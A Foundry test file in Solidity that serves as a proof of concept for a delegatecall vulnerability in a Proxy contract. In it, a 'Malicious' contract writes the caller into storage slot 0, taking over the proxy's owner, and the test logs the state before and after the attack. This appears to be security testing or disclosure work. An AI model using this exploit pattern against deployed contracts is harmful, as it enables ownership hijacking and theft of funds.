// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/proxy.sol";

// Malicious contract to demonstrate exploit
contract Malicious {
    function attack() public {
        assembly {
            sstore(0, caller())
        }
    }
}

contract ProxyTest is Test {
    Proxy public proxy;
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.prank(deployer);
        proxy = new Proxy();
    }

    function testDelegatecallVulnerability() public {
        console2.log("--- BEFORE-Trigger State ---");
        // Query initial owner from storage slot 0
        bytes32 ownerSlot = vm.load(address(proxy), bytes32(0));
        address initialOwner = address(uint160(uint256(ownerSlot)));
        console2.log("Storage slot 0 owner (expected deployer):", initialOwner);
        assertEq(initialOwner, deployer, "Initial owner incorrect");

        console2.log("--- Trigger ---");
        // Deploy and execute malicious contract
        Malicious malicious = new Malicious();
        vm.prank(attacker);
        proxy.forward(
            address(malicious),
            abi.encodeWithSignature("attack()")
        );
        console2.log("Malicious attack executed via delegatecall");

        console2.log("--- AFTER-Trigger State ---");
        // Query post-attack owner in storage slot 0
        ownerSlot = vm.load(address(proxy), bytes32(0));
        address newOwner = address(uint160(uint256(ownerSlot)));
        console2.log("Storage slot 0 owner (after attack):", newOwner);
        
        console2.log("--- Result Comparison ---");
        // Check if ownership was illegally changed
        if (newOwner == attacker) {
            console2.log("STATE CHANGED: Attacker successfully overwrote owner");
            console2.log("Vulnerability Exists: delegatecall allows arbitrary storage writes to slot0");
        } else {
            console2.log("STATE UNCHANGED: Ownership remains with deployer");
            console2.log("Vulnerability not Exist: Storage slot 0 not modified");
        }
    }
}